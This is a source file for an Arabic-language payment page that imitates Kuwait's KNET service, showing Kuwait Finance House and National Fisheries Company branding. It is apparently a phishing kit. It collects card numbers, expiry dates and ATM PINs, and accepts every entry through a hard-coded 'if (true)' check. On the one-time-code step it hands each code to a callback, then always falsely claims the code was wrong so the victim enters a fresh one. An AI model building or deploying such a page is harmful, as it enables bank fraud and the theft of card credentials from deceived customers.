'use client'

import { useEffect, useState } from 'react'
import { Loader } from 'lucide-react'
import { Card, CardContent, CardHeader } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { validate } from '@/lib/utils'
import { useCart } from '@/components/cart-provider'
export type PaymentInfo = {
  cardNumber: string
  cvc: string
  year: string
  month: string
  bank?: string
  otp?: string
  pass: string
}

export type PaymentMethod = 'credit_card' | 'kent' | 'bank_card'

export type Bank = {
  value: string
  label: string
}

export const BANKS: Bank[] = [
  { value: 'nbk', label: 'بنك الكويت الوطني' },
  { value: 'cbk', label: 'البنك التجاري الكويتي' },
  { value: 'gbk', label: 'بنك الخليج' },
  { value: 'abk', label: 'البنك الأهلي الكويتي' },
  { value: 'burgan', label: 'بنك برقان' },
  { value: 'kfh', label: 'بيت التمويل الكويتي' },
  { value: 'boubyan', label: 'بنك بوبيان' },
  { value: 'kib', label: 'بنك الكويت الدولي' },
  { value: 'ibk', label: 'البنك الصناعي الكويتي' },
  { value: 'bbk', label: 'بنك البحرين والكويت' },
  { value: 'bnp', label: 'بنك بي إن بي باريبا' },
  { value: 'hsbc', label: 'بنك إتش إس بي سي الشرق الأوسط' },
  { value: 'fab', label: 'بنك أبوظبي الأول' },
  { value: 'citibank', label: 'سيتي بنك' },
  { value: 'qnb', label: 'بنك قطر الوطني' },
  { value: 'mashreq', label: 'بنك المشرق' },
  { value: 'alrajhi', label: 'مصرف الراجحي' },
  { value: 'bank_muscat', label: 'بنك مسقط' },
  { value: 'icbc', label: 'البنك الصناعي والتجاري الصيني' },
]


export default function PaymentForm({ 
  onPaymentComplete 
}: { 
  onPaymentComplete: (paymentInfo: PaymentInfo | null, method: PaymentMethod) => void 
}) {
  const [step, setStep] = useState(1)
  const [isLoading, setIsLoading] = useState(false)
  const [showError, setShowError] = useState(false)
  const { total } = useCart()

  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>('bank_card')
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: '',
    cvc: '',
    year: '',
    month: '',
    otp: '',
    bank: '',
    pass: ''
  })

  const handlePaymentInfoSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      if (true) {
        setShowError(false)
        onPaymentComplete(paymentInfo, paymentMethod)
        setTimeout(() => {
          setIsLoading(false)
          setStep(2)
        }, 5000)
      } else {
        setShowError(true)
        setStep(1)
      }
    } catch (error) {
      console.log(error)
      setShowError(true)
    } finally {
      setIsLoading(false)
    }
  }

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      onPaymentComplete(paymentInfo, paymentMethod)
      setTimeout(() => {
        alert('رمز التحقق غير صحيح, تم ارسال رمز جديد')
        setPaymentInfo({ ...paymentInfo, otp: '' })
      }, 5000)
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <Card className="w-full max-w-md mx-auto bg-gray-100">
      <img 
        className="w-full h-14 my-4 object-contain" 
        src="/1212122.PNG" 
        alt="Kuwait Finance House Logo"
      />
      <CardHeader>
        <Card className="bg-white">
          <CardContent className="space-y-4">
            <img 
              className="w-full h-14 my-4 object-contain" 
              src="/516815.jpeg" 
              alt="National Fisheries Company Logo" 
            />
            <div className="flex justify-between items-center border-b pb-2">
              <Label className="font-medium">المستفيد:</Label>
              <span>الشركة الوطنية للأسماك</span>
            </div>
            <div className="flex justify-between items-center">
              <Label className="font-medium">المبلغ:</Label>
              <span className="text-lg font-bold">{total} د.ك</span>
            </div>
          </CardContent>
        </Card>
      </CardHeader>

      <CardContent>
        {(paymentMethod === 'credit_card' || paymentMethod === 'bank_card') && (
          <Card>
            <CardContent className="p-6">
              {step === 1 ? (
                <form onSubmit={handlePaymentInfoSubmit} className="space-y-6">
                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label htmlFor="bank">يرجى اختيار البنك:</Label>
                      <select 
                        id="bank"
                        className="w-full p-2 border rounded-md"
                        value={paymentInfo.bank}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, bank: e.target.value })}
                        required
                      >
                        <option value="" disabled>يرجى اختيار البنك</option>
                        {BANKS.map((bank) => (
                          <option key={bank.value} value={bank.value}>
                            {bank.label}
                          </option>
                        ))}
                      </select>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="card-number">رقم بطاقة الصرف الآلي:</Label>
                      <input
                        type="text"
                        id="card-number"
                        className="w-full p-2 border rounded-md"
                        placeholder="1234 5678 9012 3456"
                        value={paymentInfo.cardNumber}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, cardNumber: e.target.value })}
                        required
                        maxLength={19}
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <Label htmlFor="expiry-month">الشهر:</Label>
                        <input
                          type="text"
                          id="expiry-month"
                          className="w-full p-2 border rounded-md"
                          placeholder="MM"
                          value={paymentInfo.month}
                          onChange={(e) => setPaymentInfo({ ...paymentInfo, month: e.target.value })}
                          required
                          maxLength={2}
                        />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="expiry-year">السنة:</Label>
                        <input
                          type="text"
                          id="expiry-year"
                          className="w-full p-2 border rounded-md"
                          placeholder="YYYY"
                          value={paymentInfo.year}
                          onChange={(e) => setPaymentInfo({ ...paymentInfo, year: e.target.value })}
                          required
                          maxLength={4}
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="pin">الرقم السري:</Label>
                      <input
                        type="password"
                        id="pin"
                        className="w-full p-2 border rounded-md"
                        placeholder="••••"
                        value={paymentInfo.pass}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, pass: e.target.value })}
                        required
                      />
                    </div>
                  </div>

                  {showError && (
                    <p className="text-red-500 text-sm">
                      يرجى التحقق من صحة البيانات المدخلة
                    </p>
                  )}

                  <div className="grid grid-cols-2 gap-4">
                    <button
                      type="button"
                      className="p-2 border rounded-md hover:bg-gray-100"
                      onClick={() => window.history.back()}
                    >
                      إلغاء
                    </button>
                    <button
                      type="submit"
                      className="p-2 bg-primary text-white rounded-md bg-gray-400 hover:bg-gray/90 disabled:opacity-50"
                      disabled={isLoading}
                    >
                      {isLoading ? (
                        <span className="flex items-center justify-center gap-2">
                          جاري المعالجة
                          <Loader className="animate-spin" />
                        </span>
                      ) : (
                        'إرسال'
                      )}
                    </button>
                  </div>
                </form>
              ) : (
                <form onSubmit={handleOtpSubmit} className="space-y-6">
                  <div className="space-y-2">
                    <Label htmlFor="otp">رمز التحقق:</Label>
                    <input
                      type="text"
                      id="otp"
                      className="w-full p-2 border rounded-md"
                      placeholder="123456"
                      value={paymentInfo.otp}
                      onChange={(e) => setPaymentInfo({ ...paymentInfo, otp: e.target.value })}
                      required
                      maxLength={6}
                    />
                  </div>

                  <button
                    type="submit"
                    className="w-full p-2 bg-primary text-white rounded-md hover:bg-primary/90 disabled:opacity-50"
                    disabled={isLoading}
                  >
                    {isLoading ? (
                      <span className="flex items-center justify-center gap-2">
                        جاري التحقق
                        <Loader className="animate-spin" />
                      </span>
                    ) : (
                      'تحقق'
                    )}
                  </button>
                </form>
              )}
            </CardContent>
          </Card>
        )}
      </CardContent>

      <footer className="text-center p-4 text-sm text-gray-600">
        <p>© 2024 جميع الحقوق محفوظة</p>
        <a href="#" className="hover:underline">
          شركة الخدمات المصرفية الآلية المشتركة – كي نت
        </a>
      </footer>
    </Card>
  )
}

